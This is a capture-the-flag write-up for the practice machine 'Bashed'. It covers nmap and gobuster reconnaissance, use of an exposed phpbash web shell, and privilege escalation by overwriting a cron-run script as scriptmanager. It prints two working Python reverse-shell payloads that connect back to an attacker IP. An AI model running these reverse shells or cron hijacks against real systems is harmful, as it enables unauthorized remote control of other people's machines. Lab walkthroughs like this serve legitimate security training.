# Bashed

## Initial scan

```sh
nmap -A -T5 -p- 10.10.10.68
```

### Result

```
tarting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 02:15 EDT
Nmap scan report for 10.10.10.68
Host is up (0.22s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   203.62 ms 10.10.14.1
2   204.09 ms 10.10.10.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.12 seconds
```

## Gobuster

Seeing that there's a web server hosted on port 80, let's try using gobuster to look for any subdirectories.

```sh
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

result:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.68
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/11 20:41:05 Starting gobuster
===============================================================
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
Progress: 161818 / 220561 (73.37%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/04/11 21:41:57 Finished
===============================================================
```

navigating through the dev folder, we find that there's a phpbash script available

## PHP bash

A quick look at the documentation of phpbash tells us which commands are available:
[php-bash github](https://github.com/Arrexel/phpbash)

On our local machine:
```sh
nc -nlvp 4444
```

On the phpbash:
```sh
cd /home/arrexel
cat user.txt

# Getting a reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Priv esc

```sh
sudo -l # shows we can run things as scriptmanager group
sudo -u scriptmanager ls -Al /scripts # here we notice that there's a script that's getting run by a CRON job
sudo -u scriptmanager vi /scripts/test.py
```

Now insert the python code into the machine

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.14",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

And check if it was inserted correctly

```sh
sudo -u scriptmanager cat /scripts/test.py
```

Now just open another netcat session

```sh
nc -nvlp 5555
```

and once the CRON job runs the python file, we are able to get a reverse shell.